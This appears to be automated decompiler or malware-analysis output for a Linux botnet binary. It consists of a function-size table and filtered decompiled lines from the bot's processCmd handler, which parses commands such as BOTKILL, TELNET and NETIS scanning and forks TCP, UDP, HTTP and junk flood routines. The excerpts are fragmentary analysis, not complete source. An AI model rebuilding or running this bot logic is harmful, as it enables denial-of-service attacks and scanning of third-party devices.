__GI_vsnprintf                                    |4   |157     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |2   |205     |1             |35          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |146     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |169     |1             |17          |
----------------------------------------------------------------------------------------------
HackerScan                                        |1   |147     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |221     |1             |31          |
----------------------------------------------------------------------------------------------
socket                                            |3   |145     |1             |0           |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |188     |1             |28          |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |146     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |3   |145     |1             |0           |
----------------------------------------------------------------------------------------------
access                                            |2   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |5   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |165     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |158     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |161     |0             |0           |
----------------------------------------------------------------------------------------------
malloc_trim                                       |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |157     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |3   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |146     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |157     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |4   |159     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |180     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |199     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |0   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |4   |284     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__get_pc_thunk_bx                                 |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |4   |227     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |157     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |1   |152     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |3   |291     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |157     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |159     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |2   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |0   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |0   |153     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |177     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |4   |153     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |0   |175     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |0   |166     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |4   |146     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |166     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |159     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |3   |157     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |172     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |4   |156     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |3   |176     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |0   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |147     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |3   |168     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |0   |294     |0             |0           |
----------------------------------------------------------------------------------------------
hstrerror                                         |1   |153     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |3   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |0   |149     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |152     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_trim                                     |0   |187     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |4   |225     |0             |0           |
----------------------------------------------------------------------------------------------
function_8048120                                  |0   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |0   |179     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |0   |156     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
mmap                                              |8   |149     |0             |0           |
----------------------------------------------------------------------------------------------
munmap                                            |4   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |4   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |0   |187     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |0   |157     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_largebin_index                           |0   |165     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |1   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |160     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |4   |357     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |4   |157     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |2   |158     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |1   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |3   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |1   |164     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |5   |157     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |145     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |3   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |2   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |0   |171     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |150     |0             |0           |
----------------------------------------------------------------------------------------------
free                                              |1   |343     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |1   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |156     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |0   |161     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |164     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |157     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |0   |148     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |212     |0             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |4   |219     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |1   |158     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |177     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |5   |160     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |0   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |0   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |148     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 14708
++++++++ FUNCTION END 24890
++++++++ FUNCTION LENGTH 10182
    int32_t v142 = ((int32_t)(v140 | _strncmp((char *)v138, "PING", 5) % 2 == 0) | v141 & -256) ^ 1; // 0x804fe45
        int32_t v146 = ((int32_t)(v145 | _strncmp((char *)v144, "GETLOCALIP", 11) % 2 == 0) | v142 & -256) ^ 1; // 0x804fea6
            int32_t v149 = ((int32_t)(v148 | _strncmp((char *)v147, "BOTKILL", 8) % 2 == 0) | v146 & -256) ^ 1; // 0x804ff19
                if (listFork() == 0) {
                    HackerPrint((int32_t)v143, (int32_t)"Killing Bots");
                    botkiller();
                if (listFork() == 0) {
                    HackerPrint((int32_t)v143, (int32_t)"LOOPING PAYLOAD");
            int32_t v155 = ((int32_t)(v154 | _strncmp((char *)v153, "TELNET", 7) % 2 == 0) | v152 & -256) ^ 1; // 0x805000a
                v211 = _strncmp((char *)*a2, "NETIS", 6);
                        HackerPrint((int32_t)v143, (int32_t)"[NETIS] SCANNER Starting");
                        StartTheNetis();
                        v219 = _strncmp((char *)*a2, "UDP", 4);
                            v221 = _strncmp((char *)*a2, "HTTP", 5);
                                            v288 = _strncmp((char *)*a2, "TCP", 4);
                                                    while (true) {
                                                            if (*v306 != __libc_getpid()) {
                                                                kill(v308, 9);
                                                                        v269 = listFork();
                                                                            sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    sendTCP(v309, v281, v282, v283, (char *)v284, v266, v267);
                                                                                while (true) {
                                                                            while (true) {
                                                        result5 = listFork();
                                                            sendSTD(v260, v261, v262);
                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                while (true) {
                                                                                    v269 = listFork();
                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                        while (true) {
                                                    while (true) {
                                                        if (listFork() == 0) {
                                                            sendSTD(v311, v261, v262);
                                                    v288 = _strncmp((char *)*a2, "TCP", 4);
                                                            while (true) {
                                                                                v269 = listFork();
                                                                                    sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                    while (true) {
                                                    if (listFork() == 0) {
                                                        sendJUNK(v249, v250, v251);
                                                        sendSTD(v249, v250, v251);
                                                        sendHOLD(v249, v250, v251);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendJUNK(v242, v250, v251);
                                                                sendSTD(v242, v250, v251);
                                                                sendHOLD(v242, v250, v251);
                                                                __libc_close((int32_t)v143);
                                                            v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                    while (true) {
                                                                                        v269 = listFork();
                                                                                            sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                            while (true) {
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v263, v261, v262);
                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                while (true) {
                                                                                                    v269 = listFork();
                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                        while (true) {
                                                                    result5 = listFork();
                                                                        sendSTD(v260, v261, v262);
                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                        while (true) {
                                                                        if (listFork() == 0) {
                                                                            sendSTD(v260, v261, v262);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v263, v261, v262);
                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                        while (true) {
                                                    if (listFork() == 0) {
                                                        sendCNC(v236, v237, v238);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendCNC(v314, v237, v238);
                                                                __libc_close((int32_t)v143);
                                                                v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                        while (true) {
                                                                                            v269 = listFork();
                                                                                                sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                while (true) {
                                                                                result5 = listFork();
                                                                                    sendSTD(v260, v261, v262);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v263, v261, v262);
                                                                                v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                        while (true) {
                                                                                                            v269 = listFork();
                                                                                                                sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                while (true) {
                                                                            v244 = listFork();
                                                                                sendJUNK(v249, v250, v251);
                                                                                sendSTD(v249, v250, v251);
                                                                                sendHOLD(v249, v250, v251);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendJUNK(v242, v250, v251);
                                                                                    sendSTD(v242, v250, v251);
                                                                                    sendHOLD(v242, v250, v251);
                                                                                    __libc_close((int32_t)v143);
                                                                                v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                        while (true) {
                                                                                                            v269 = listFork();
                                                                                                                sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                while (true) {
                                                                                                result5 = listFork();
                                                                                                    sendSTD(v260, v261, v262);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v263, v261, v262);
                                                                                                v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                        while (true) {
                                                                                                                            v269 = listFork();
                                                                                                                                sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                                while (true) {
                                                            v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                                            sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                            while (true) {
                                                                            if (listFork() == 0) {
                                                                                sendSTD(v260, v261, v262);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendSTD(v263, v261, v262);
                                                                            v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                        if (listFork() == 0) {
                                                                            sendJUNK(v249, v250, v251);
                                                                            sendSTD(v249, v250, v251);
                                                                            sendHOLD(v249, v250, v251);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendJUNK(v242, v250, v251);
                                                                                sendSTD(v242, v250, v251);
                                                                                sendHOLD(v242, v250, v251);
                                                                                __libc_close((int32_t)v143);
                                                                            v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v260, v261, v262);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v263, v261, v262);
                                                                                            v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                        if (listFork() == 0) {
                                            sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                            while (true) {
                                                if (listFork() == 0) {
                                                    sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                    v269 = listFork();
                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                        result5 = listFork();
                                                                            sendSTD(v260, v261, v262);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v263, v261, v262);
                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                    v269 = listFork();
                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                    v244 = listFork();
                                                                        sendJUNK(v249, v250, v251);
                                                                        sendSTD(v249, v250, v251);
                                                                        sendHOLD(v249, v250, v251);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendJUNK(v242, v250, v251);
                                                                            sendSTD(v242, v250, v251);
                                                                            sendHOLD(v242, v250, v251);
                                                                            __libc_close((int32_t)v143);
                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                    v269 = listFork();
                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                        result5 = listFork();
                                                                                            sendSTD(v260, v261, v262);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v263, v261, v262);
                                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                    v269 = listFork();
                                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                v227 = listFork();
                                                                    sendCNC(v236, v237, v238);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendCNC(v239, v237, v238);
                                                                        __libc_close((int32_t)v143);
                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                    v269 = listFork();
                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                        result5 = listFork();
                                                                                            sendSTD(v260, v261, v262);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v263, v261, v262);
                                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                    v269 = listFork();
                                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                    v244 = listFork();
                                                                                        sendJUNK(v249, v250, v251);
                                                                                        sendSTD(v249, v250, v251);
                                                                                        sendHOLD(v249, v250, v251);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendJUNK(v242, v250, v251);
                                                                                            sendSTD(v242, v250, v251);
                                                                                            sendHOLD(v242, v250, v251);
                                                                                            __libc_close((int32_t)v143);
                                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                    v269 = listFork();
                                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                        result5 = listFork();
                                                                                                            sendSTD(v260, v261, v262);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v263, v261, v262);
                                                                                                        v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                                                    v269 = listFork();
                                                                                                                                        sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() != 0) {
                                                                                                                                            sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                    v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                if (listFork() == 0) {
                                                                                    sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                    if (listFork() == 0) {
                                                                        sendSTD(v260, v261, v262);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendSTD(v263, v261, v262);
                                                                    v288 = _strncmp((char *)*a2, "TCP", 4);
                                                                                                if (listFork() == 0) {
                                                                                                    sendTCP(v280, v281, v282, v283, (char *)v284, v266, v267);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
                                                                if (listFork() == 0) {
                                                                    sendJUNK(v249, v250, v251);
                                                                    sendSTD(v249, v250, v251);
                                                                    sendHOLD(v249, v250, v251);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendJUNK(v242, v250, v251);
                                                                        sendSTD(v242, v250, v251);
                                                                        sendHOLD(v242, v250, v251);
                                                                        __libc_close((int32_t)v143);
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v260, v261, v262);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v263, v261, v262);
                                                            if (listFork() == 0) {
                                                                sendCNC(v236, v237, v238);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendCNC(v239, v237, v238);
                                                                    __libc_close((int32_t)v143);
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v260, v261, v262);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v263, v261, v262);
                                                                                if (listFork() == 0) {
                                                                                    sendJUNK(v249, v250, v251);
                                                                                    sendSTD(v249, v250, v251);
                                                                                    sendHOLD(v249, v250, v251);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendJUNK(v242, v250, v251);
                                                                                        sendSTD(v242, v250, v251);
                                                                                        sendHOLD(v242, v250, v251);
                                                                                        __libc_close((int32_t)v143);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v260, v261, v262);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v263, v261, v262);
                                                            if (listFork() == 0) {
                                                                sendUDP(v186, v187, v188, v189, v190, v158);
                                                                while (true) {
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v317, v187, v188, v189, v190, v158);
                                                                v221 = _strncmp((char *)*a2, "HTTP", 5);
                                                                                                result5 = listFork();
                                                                                                    sendSTD(v260, v261, v262);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v263, v261, v262);
                                                                                            v244 = listFork();
                                                                                                sendJUNK(v249, v250, v251);
                                                                                                sendSTD(v249, v250, v251);
                                                                                                sendHOLD(v249, v250, v251);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendJUNK(v242, v250, v251);
                                                                                                    sendSTD(v242, v250, v251);
                                                                                                    sendHOLD(v242, v250, v251);
                                                                                                    __libc_close((int32_t)v143);
                                                                                                                result5 = listFork();
                                                                                                                    sendSTD(v260, v261, v262);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v263, v261, v262);
                                                                                        v227 = listFork();
                                                                                            sendCNC(v236, v237, v238);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v239, v237, v238);
                                                                                                __libc_close((int32_t)v143);
                                                                                                                result5 = listFork();
                                                                                                                    sendSTD(v260, v261, v262);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() != 0) {
                                                                                                                        sendSTD(v263, v261, v262);
                                                                                                            v244 = listFork();
                                                                                                                sendJUNK(v249, v250, v251);
                                                                                                                sendSTD(v249, v250, v251);
                                                                                                                sendHOLD(v249, v250, v251);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendJUNK(v242, v250, v251);
                                                                                                                    sendSTD(v242, v250, v251);
                                                                                                                    sendHOLD(v242, v250, v251);
                                                                                                                    __libc_close((int32_t)v143);
                                                                                                                                result5 = listFork();
                                                                                                                                    sendSTD(v260, v261, v262);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() != 0) {
                                                                                                                                        sendSTD(v263, v261, v262);
                                                                            v225 = listFork();
                                                                                sendHTTP(*v175, v207, (int16_t)v206, v204, v203, v201);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
                                                                                                        result5 = listFork();
                                                                                                            sendSTD(v260, v261, v262);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v263, v261, v262);
                                                                                                    v244 = listFork();
                                                                                                        sendJUNK(v249, v250, v251);
                                                                                                        sendSTD(v249, v250, v251);
                                                                                                        sendHOLD(v249, v250, v251);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendJUNK(v242, v250, v251);
                                                                                                            sendSTD(v242, v250, v251);
                                                                                                            sendHOLD(v242, v250, v251);
                                                                                                            __libc_close((int32_t)v143);
                                                                                                                        result5 = listFork();
                                                                                                                            sendSTD(v260, v261, v262);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v263, v261, v262);
                                                                                                v227 = listFork();
                                                                                                    sendCNC(v236, v237, v238);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v239, v237, v238);
                                                                                                        __libc_close((int32_t)v143);
                                                                                                                        result5 = listFork();
